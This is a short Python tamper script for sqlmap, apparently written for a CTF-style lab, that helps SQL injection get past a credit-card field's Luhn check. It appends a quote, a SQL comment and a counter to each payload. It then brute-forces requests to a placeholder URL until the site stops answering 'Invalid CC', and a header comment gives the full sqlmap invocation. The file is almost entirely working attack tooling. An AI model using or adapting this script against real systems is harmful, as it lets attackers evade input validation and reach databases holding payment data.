# This is a sqlmap tamper script. generating the next luhn character
# didnt work, so i just created a request to the site till i got a valid response. 
# sqlmap -r req.txt -p cc --string="Your CC has been compromised" --proxy="http://localhost:8080" --tamper=path_to_this_file
import requests

def dependencies():
	pass

# def luhn_checksum(card_number):
#     def digits_of(n):
#         return [int(d) for d in str(n)]
#     digits = digits_of(card_number)
#     odd_digits = digits[-1::-2]
#     even_digits = digits[-2::-2]
#     checksum = 0
#     checksum += sum(odd_digits)
#     for d in even_digits:
#         checksum += sum(digits_of(d*2))
#     return checksum % 10
#
# def is_luhn_valid(card_number):
#     return luhn_checksum(card_number) == 0

def getFixedPayload(payload):
	i = 0
	found = False

	while (found == False):
		newCC = payload + "'" + '-- ' + str(i)
		r = requests.post("URL", data={'cc': newCC, 'check': 'Submit Query'})
		found = (str.__contains__(str(r.text), 'Invalid CC') == False)
		i = i + 1
	return newCC


def extractNums(str):
	nums = ''.join([n for n in str if n.isdigit()])
	return nums

def tamper(payload, **kwargs):
	fixedPayload = getFixedPayload(payload)
	return fixedPayload